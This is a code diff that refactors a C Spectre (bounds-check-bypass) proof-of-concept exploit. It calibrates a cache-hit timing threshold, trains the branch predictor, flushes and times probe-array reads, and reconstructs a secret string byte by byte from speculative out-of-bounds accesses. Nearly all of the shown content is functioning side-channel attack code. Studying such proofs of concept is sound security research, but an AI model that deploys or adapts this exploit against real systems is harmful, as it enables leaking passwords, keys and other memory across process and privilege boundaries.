@@ -10,6 +10,7 @@
 #include <stdint.h>
 #include <string.h>
 #include <pthread.h>
+#include <stdbool.h>
 
 /********************************************************************
 Victim code.
@@ -92,7 +93,7 @@ static inline uint32_t memaccesstime(void *v) {
     return rv;
 }
 
-static int getCacheHitThresholdTime(int N) {
+static int getCacheHitThresholdTime(int N, bool verbose) {
     uint8_t a[N];
     int ramAccessTime[N], cacheAccessTime[N];
     int avgRamAccessTime = 0;
@@ -115,9 +116,14 @@ static int getCacheHitThresholdTime(int N) {
     avgRamAccessTime /= N;
     avgCacheAccessTime /= N;
 
-//    printf("Average RAM Access Time  : %d\n", avgRamAccessTime);
-//    printf("Average Cache Access Time: %d\n", avgCacheAccessTime);
-    return (avgRamAccessTime + avgCacheAccessTime) / 2;
+    int cacheHitThreshold = (avgRamAccessTime + avgCacheAccessTime) / 2;
+    if (verbose) {
+        printf("\n");
+        printf("Average RAM Access Time   : %4d\n", avgRamAccessTime);
+        printf("Average Cache Access Time : %4d\n", avgCacheAccessTime);
+        printf("Cache Hit Threshold       : %4d\n", cacheHitThreshold);
+    }
+    return cacheHitThreshold;
 }
 
 static inline void callVictimCodeWithFlushedCache(size_t address) {
@@ -126,16 +132,18 @@ static inline void callVictimCodeWithFlushedCache(size_t address) {
     victim_function(address);
 }
 
-void checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num_tries, int value[2]) {
+int *checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num_tries) {
     static int results[256];
+    static int returnValues[2];
+
+    static int i, temp;
     static int time;
-    static int i;
-    static int trainingAddress;
+    static size_t trainingAddress;
 
     for (i = 0; i < 256; i++) results[i] = 0;
 
     while (num_tries-- > 0) {
-        trainingAddress = num_tries % ((int) array1_size);
+        trainingAddress = num_tries % array1_size;
 
         /* Flush array2[256*(0..255)] from cache */
         for (i = 0; i < 256; i++)
@@ -152,10 +160,10 @@ void checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num
 
         /* Time reads. Order is lightly mixed up to prevent stride prediction */
         for (i = 0; i < 256; i++) {
-            int mix_i = ((i * 167) + 13) & 255;
-            time = (int) memaccesstime(&array2[mix_i * 512]);
-            if (time < cacheHitThreshold && mix_i != array1[trainingAddress]) {
-                results[mix_i]++;
+            temp = ((i * 167) + 13) & 255;
+            time = (int) memaccesstime(&array2[temp * 512]);
+            if (time < cacheHitThreshold && temp != array1[trainingAddress]) {
+                results[temp]++;
             }
         }
     }
@@ -166,8 +174,10 @@ void checkRelativeAddress(int cacheHitThreshold, size_t relativeAddress, int num
             max_index = i;
         }
     }
-    value[0] = max_index;
-    value[1] = results[max_index];
+
+    returnValues[0] = max_index;
+    returnValues[1] = results[max_index];
+    return returnValues;
 }
 
 int main() {
@@ -175,22 +185,22 @@ int main() {
     const int maxStringSize = 1000;
 
     int index = 0;
+    int *probableValue;
     char foundSecret[maxStringSize];
-    int probableValue[2];
 
-    const int cacheHitThreshold = getCacheHitThresholdTime(10000);
-    size_t secretRelativeAddress = (size_t) (secret - (char *) array1);
+    const int cacheHitThreshold = getCacheHitThresholdTime(10000, true);
+    size_t secretRelativeAddress = ((size_t) secret) - ((size_t) array1);
 
     /* write to array2 so in RAM not copy-on-write zero pages */
     for (int i = 0; i < (int) sizeof(array2); i++) array2[i] = 0;
 
-    printf("Using a cache hit threshold of %d.\n", cacheHitThreshold);
+    printf("\n");
     printf("Reading %lu bytes:\n", strlen(secret));
 
-    while (1) {
+    while (true) {
         if (index > maxStringSize) break;
 
-        checkRelativeAddress(cacheHitThreshold, secretRelativeAddress, num_tries, probableValue);
+        probableValue = checkRelativeAddress(cacheHitThreshold, secretRelativeAddress, num_tries);
         foundSecret[index] = (char) probableValue[0];
         foundSecret[index + 1] = '\0';
         if (foundSecret[index] == '\0') break;
